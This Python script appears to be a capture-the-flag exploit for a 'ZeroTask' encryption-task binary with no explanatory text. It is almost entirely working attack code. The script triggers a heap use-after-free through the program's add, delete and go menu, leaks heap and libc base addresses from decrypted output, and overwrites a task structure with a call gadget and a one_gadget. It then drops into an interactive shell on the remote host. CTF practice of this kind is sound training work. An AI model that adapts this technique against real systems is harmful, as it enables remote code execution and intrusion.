#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
from Crypto.Cipher import AES

bin_file = './task_52f1358baddfd3d4026da4d8c0735e52'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

gdbscript ='''
set follow-fork-mode parent
set $base = 0x0000555555554000
set $head = $base + 0x202028
'''

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':gdbscript}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.27.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    task = ZeroTask(conn)

    KEY = 'abcd'*8
    IV  = '1234'*4

    task.add(1, True, KEY, IV,'a'*8)
    task.add(2, True, KEY, IV,'b'*8)
    task.go(1)
    task.delete(2)
    task.delete(1)
    task.add(3, True, KEY, IV, 8)

    addr_heap_base = u64(decrypt(KEY, IV, task.recv_cipher())[:8]) - 0x1720
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    conn.send('c'*8)
    task.delete(3)

    task.add(4, True, KEY, IV, 'd'*0x430)
    task.add(5, True, KEY, IV,'e'*8)
    task.go(4)
    task.delete(4)
    task.add(6, True, KEY, IV, 0x430)

    addr_libc_mainarena = u64(decrypt(KEY, IV, task.recv_cipher())[:8]) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_call_rax_0x38 = libc.address + 0x59bb5
    addr_libc_onegadget     = libc.address + 0x4f322
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    conn.send('f'*0x430)
    task.delete(5)
    task.delete(6)

    task.add(7, True, KEY, IV,'g'*8)
    task.add(8, True, KEY, IV,'h'*8)
    task.go(7)
    task.delete(7)
    task.delete(8)

    fake_task  = '\x00'*0x12
    fake_task += chr(0x10)
    fake_task  = fake_task.ljust(0x20, '\x00')
    fake_task += p64(addr_libc_call_rax_0x38)
    fake_task  = fake_task.ljust(0x38, '\x00')
    fake_task += p64(addr_libc_onegadget)
    task.add(9, True, KEY, IV, (p64(addr_heap_base + 0x1308) + fake_task).ljust(0xa0, 'i'))

    conn.recvuntil('Choice: ', '1')
    sleep(2)
    
def decrypt(key, iv, data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(data)

class ZeroTask:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, tid, is_enc, key, iv, data):
        self.sendlineafter('Choice: ', '1')
        self.sendlineafter('id : ', str(tid))
        self.sendlineafter('Encrypt(1) / Decrypt(2): ', '1' if is_enc else '2')
        self.sendafter('Key : ', key)
        self.sendafter('IV : ', iv)
        if type(data) is str:
            self.sendlineafter('Size : ', str(len(data)))
            self.sendafter('Data : ', data)
        elif type(data) is int:
            self.sendlineafter('Size : ', str(data))

    def delete(self, tid):
        self.sendlineafter('Choice: ', '2')
        self.sendlineafter('id : ', str(tid))

    def go(self, tid):
        self.sendlineafter('Choice: ', '3')
        self.sendlineafter('id : ', str(tid))

    def recv_cipher(self):
        self.recvuntil('Ciphertext: \n')
        return ''.join(map(lambda x : x.decode('hex'), self.recvuntil('\n').split()))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
